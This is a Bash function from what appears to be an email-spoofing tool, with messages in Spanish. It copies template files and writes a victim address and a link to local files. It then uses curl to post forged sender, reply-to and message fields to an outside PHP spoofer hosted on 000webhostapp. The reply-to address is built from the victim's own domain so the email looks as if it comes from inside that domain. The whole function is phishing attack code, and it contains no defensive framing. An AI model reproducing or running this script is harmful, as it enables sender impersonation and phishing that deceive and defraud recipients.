send_msj(){
        if [[ $establecido == "si" ]];then
                nosexd="$r[!]$b Eliminaste un archivo de la carpeta core, si quieres enviar emails vuelve añadir ese archivo."
        if [[ -f email ]];then
               rm email
        fi

        if [[ -f pr1 ]];then
                rm pr1
        fi
        if [[ -f pr2 ]];then
                rm pr2
        fi
        if [[ -f pr3 ]];then
                rm pr3
        fi
        if [[ -f pr4 ]];then
                rm pr4
        fi
        if [[ -f $OLDPWD/core/pr1 ]];then
                cp $OLDPWD/core/pr1 $OLDPWD/$ruta_carpeta
        else
                echo -e $nosexd
                exit 1
        fi
        if [[ -f $OLDPWD/core/pr4 ]];then
                cp $OLDPWD/core/pr2 $OLDPWD/$ruta_carpeta
        else
                echo -e $nosexd
                exit 1
        fi
        if [[ -f $OLDPWD/core/pr3 ]];then
                cp $OLDPWD/core/pr3 $OLDPWD/$ruta_carpeta
        else
                echo -e $nosexd
                exit 1
        fi
        if [[ -f $OLDPWD/core/pr4 ]];then
                cp $OLDPWD/core/pr4 $OLDPWD/$ruta_carpeta
        else
                echo -e $nosexd
                exit 1
        fi
        if [[ -f $OLDPWD/core/email ]];then
                cp $OLDPWD/core/email $OLDPWD/$ruta_carpeta
        else
                echo -e "$r[!]$b Eliminaste el archivo que contenia el email:c"
                exit 1
        fi
        if [[ -f hola ]];then
                rm hola
        fi
        if [[ -f victima ]];then
                rm victima
        fi

        replyr=$(echo $victim | cut -d "@" -f2)
        replye="$send@$replyr"
        echo $victim >> victima
        echo $envialink >> hola
        source email
        mens=$correobycalvinharrisxd
        curl --data "fromname=$send && fromemail=$correo && replyname=$send && replyemail=$replye && to=$victim && message=$mens && subject=$tema" https://pruebaemailspoof.000webhostapp.com/ephp_spoofer/ephp_spoofer.php -o spoof > /dev/null 2>&1
        
        if [[ -f spoof ]];then
                extraer_msj=$(grep -o "Successfully" spoof)
        if [[ $extraer_msj == "Successfully" ]];then
                echo -e "$v[$b*$v]$b Email enviado correctamente:)"
                rm spoof
        else
                echo -e "$r[!]$b No se envio el email:("
                rm spoof
                fi

        else
                echo -e "$r[!]$b No se envio el email, comprueba tu conexión"
        fi

        else
                curl --data "fromname=$send && fromemail=$correo && replyname=$send && replyemail=$replye && to=$victim && message=$msj && subject=$tema" https://pruebaemailspoof.000webhostapp.com/ephp_spoofer/ephp_spoofer.php -o spoof > /dev/null 2>&1
        if [[ -f spoof ]];then
                extraer_msj=$(grep -o "Successfully" spoof)
        if [[ $extraer_msj == "Successfully" ]];then
                echo -e "$v[$b*$v]$b Email enviado correctamente:)"
                rm spoof
        else
                echo -e "$r[!]$b No se envio el email:("
                rm spoof
        fi

        else
                echo -e "$r[!]$b No se envio el email, comprueba tu conexión"
        fi
    
        fi
}